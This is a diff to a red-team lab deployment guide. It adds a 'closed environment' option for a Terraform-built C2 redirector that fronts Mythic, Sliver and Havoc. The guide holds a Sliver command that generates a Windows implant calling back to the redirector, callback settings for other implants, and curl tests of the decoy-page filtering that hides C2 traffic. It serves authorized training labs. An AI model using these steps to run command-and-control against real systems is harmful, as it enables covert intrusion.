@@ -230,8 +230,24 @@ notepad terraform.tfvars  # Windows
 localPub_ip          = "YOUR_IP/32"           # Replace with your IP + /32
 ssh_key_name         = "rs-rsa-key"           # Must match your AWS key pair name
 ssh_private_key_path = "./rs-rsa-key.pem"     # Path to your .pem file (for Windows password decryption)
-redirector_domain    = "c2.yourdomain.tld"    # Your domain — apex or subdomain (see Step 1.6)
 ```
+
+> [!NOTE]
+> **Open vs Closed Environment — choose before deploying:**
+>
+> **Open environment** (internet access, domain registered):
+> Set `redirector_domain` to your domain. Complete Step 1.6 (DNS) and Step 3.1 (Certbot) to get a trusted TLS certificate. Agents call back using your domain over HTTPS.
+>
+> ```hcl
+> redirector_domain = "c2.yourdomain.tld"
+> ```
+>
+> **Closed environment** (no DNS, no internet — HTB/THM Pro Labs, isolated networks):
+> Leave `redirector_domain` empty. The redirector uses its public Elastic IP as the server identity. A self-signed certificate with the IP as a Subject Alternative Name is generated automatically. Skip Step 1.6 and Step 3.1. Agents call back using the redirector IP over HTTPS or HTTP.
+>
+> ```hcl
+> # redirector_domain = ""   # leave commented out or set to empty string
+> ```
 
 **Optional:** these have sensible defaults but affect callback URLs baked into payloads and VPN routing. Review before deploying:
 
@@ -350,6 +366,9 @@ terraform output network_architecture
 **Checkpoint:** ✅ Output saved, network diagram displayed
 
 ### Step 1.6: Point Domain to Redirector
+
+> [!NOTE]
+> **Closed environment (no DNS):** Skip this step entirely. No domain or DNS record is needed. Proceed to Part 2.
 
 After deployment, you need to point your domain's DNS to the redirector's Elastic IP so that Certbot can obtain a valid SSL certificate.
 
@@ -485,6 +504,9 @@ ping guac
 This section covers the one manual step required after deployment (SSL certificate), then walks through the pre-configured security layers.
 
 ### Step 3.1: Obtain SSL Certificate
+
+> [!NOTE]
+> **Closed environment (no DNS):** Skip this step. A self-signed certificate with your redirector's public IP as the Subject Alternative Name was generated automatically at deploy time. Agents and test commands work over both HTTP and HTTPS using the IP directly. Proceed to Step 3.2.
 
 Once DNS has propagated (Step 1.6), SSH to the redirector and run Certbot.
 
@@ -717,15 +739,16 @@ Mythic and Sliver have the URI prefix stripped before forwarding. Havoc receives
 # Set a browser User-Agent for testing
 UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 HEADER_VALUE="<token from terraform output deployment_info>"
+TARGET="yourdomain.tld"          # or <REDIR_PUBLIC_IP> for IP-only/closed environments
 
 # Should get DECOY PAGE (no header)
-curl -sk -A "$UA" https://<YOUR_DOMAIN>/
+curl -sk -A "$UA" https://$TARGET/
 
 # Should get DECOY PAGE (wrong header value)
-curl -sk -A "$UA" -H "X-Request-ID: wrong-value" https://<YOUR_DOMAIN>/cdn/media/stream/test
+curl -sk -A "$UA" -H "X-Request-ID: wrong-value" https://$TARGET/cdn/media/stream/test
 
 # Should be PROXIED to Mythic (connection refused/timeout if no listener running yet — that's expected)
-curl -sk -A "$UA" -H "X-Request-ID: $HEADER_VALUE" https://<YOUR_DOMAIN>/cdn/media/stream/test
+curl -sk -A "$UA" -H "X-Request-ID: $HEADER_VALUE" https://$TARGET/cdn/media/stream/test
 ```
 
 **Checkpoint:** ✅ Security layers verified
@@ -833,7 +856,7 @@ The wizard has 5 steps:
 
 | Field | Value |
 | ----- | ----- |
-| `callback_host` | `https://yourdomain.tld` (full URL to your redirector domain) |
+| `callback_host` | `https://yourdomain.tld` (domain) or `https://<REDIR_PUBLIC_IP>` (IP-only/closed env) |
 | `callback_port` | `443` |
 | `callback_interval` | `10` |
 | `callback_jitter` | `20` |
@@ -959,7 +982,7 @@ Generate the implant using the `redstack` C2 profile:
 sliver > generate --http https://<YOUR_DOMAIN>/cloud/storage/objects/ --os windows --arch amd64 --format exe --c2profile redstack --save /tmp/implant.exe
 ```
 
-Replace `<YOUR_DOMAIN>` with your `redirector_domain` value from `terraform.tfvars`. The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.
+Replace `<YOUR_DOMAIN>` with your `redirector_domain` value from `terraform.tfvars`, or the redirector's public IP for closed/IP-only environments (`https://<REDIR_PUBLIC_IP>/cloud/storage/objects/`). The `/cloud/storage/objects/` prefix is stripped by the redirector before forwarding to Sliver.
 
 **Transfer the implant to the Windows workstation:**
 
@@ -1100,7 +1123,7 @@ havoc-client client
 | Field | Value |
 | ----- | ----- |
 | Payload | Http |
-| **Hosts** | `<YOUR_REDIRECTOR_DOMAIN>` — click **Add** |
+| **Hosts** | `yourdomain.tld` (domain) or `<REDIR_PUBLIC_IP>` (IP-only/closed env) — click **Add** |
 | Host (Bind) | `0.0.0.0` |
 | PortBind | `80` |
 | **PortConn** | `80` |
@@ -1269,15 +1292,16 @@ grep -c 'RewriteCond' /etc/apache2/redirect.rules
 ```bash
 UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 HEADER_VALUE="<token from terraform output deployment_info>"
+TARGET="yourdomain.tld"          # or <REDIR_PUBLIC_IP> for IP-only/closed environments
 
 # Should return DECOY PAGE (no header)
-curl -sk -A "$UA" https://<YOUR_DOMAIN>/
+curl -sk -A "$UA" https://$TARGET/
 
 # Should return DECOY PAGE (wrong header)
-curl -sk -A "$UA" -H "X-Request-ID: wrong-value" https://<YOUR_DOMAIN>/cdn/media/stream/test
+curl -sk -A "$UA" -H "X-Request-ID: wrong-value" https://$TARGET/cdn/media/stream/test
 
 # Should proxy to Mythic (connection refused if no listener — expected)
-curl -sk -A "$UA" -H "X-Request-ID: $HEADER_VALUE" https://<YOUR_DOMAIN>/cdn/media/stream/test
+curl -sk -A "$UA" -H "X-Request-ID: $HEADER_VALUE" https://$TARGET/cdn/media/stream/test
 ```
 
 **View Apache logs:**
